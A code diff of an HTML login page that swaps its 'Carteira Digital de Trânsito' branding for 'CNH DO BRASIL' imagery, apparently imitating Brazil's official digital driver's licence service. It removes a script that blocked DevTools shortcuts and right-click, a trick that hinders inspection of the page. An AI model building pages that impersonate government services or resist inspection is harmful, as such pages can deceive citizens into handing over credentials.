@@ -6,8 +6,8 @@
  
 
   <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
-  <link rel="icon" href="/staticcnh/favicon.png" type="image/png" />
-   <title>CDT</title>
+  <link rel="icon" href="/static/staticcnh/favico.png" type="image/png" />
+   <title>CNH DO BRASIL</title>
 
   <style>
     html, body {
@@ -217,13 +217,17 @@ main, div, section, * {
 
 }
 
-
+.logo-cnh {
+  width: 250px;           /* diminui o tamanho */
+  display: block;
+  margin: 0 auto 10px;    /* centraliza e aproxima do texto */
+}
 
 
   </style>
 </head>
 <body>
-<img src="/staticcnh/bg_login.jpg" class="bg-image">
+<img src="/static/staticcnh/Cnhdobrasa1.png" class="bg-image">
 
 
 
@@ -236,8 +240,7 @@ main, div, section, * {
 
   <div class="overlay">
 <div class="text-block">
-  <h2>Bem-vindo à CDT</h2>
-  <h3>Carteira Digital de Trânsito</h3>
+<img src="/static/staticcnh/cnhdobrasa2.png" class="logo-cnh">
   <br>
   <p>
     Ao entrar, você concorda com nosso<br>
@@ -282,34 +285,6 @@ main, div, section, * {
         }, 1000); // tempo de exibição do loader
       }
     }, { passive: true });
-
-
-
-
-
-
-  // Bloqueia atalhos comuns de DevTools
-  document.addEventListener("keydown", function(e) {
-    // F12
-    if (e.key === "F12") {
-      e.preventDefault();
-    }
-
-    // Ctrl+Shift+I
-    if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "i") {
-      e.preventDefault();
-    }
-
-    // Ctrl+U
-    if (e.ctrlKey && e.key.toLowerCase() === "u") {
-      e.preventDefault();
-    }
-  });
-
-  // Bloqueia clique direito (menu de contexto)
-  document.addEventListener("contextmenu", function(e) {
-    e.preventDefault();
-  });
   </script>
 </body>
 </html>
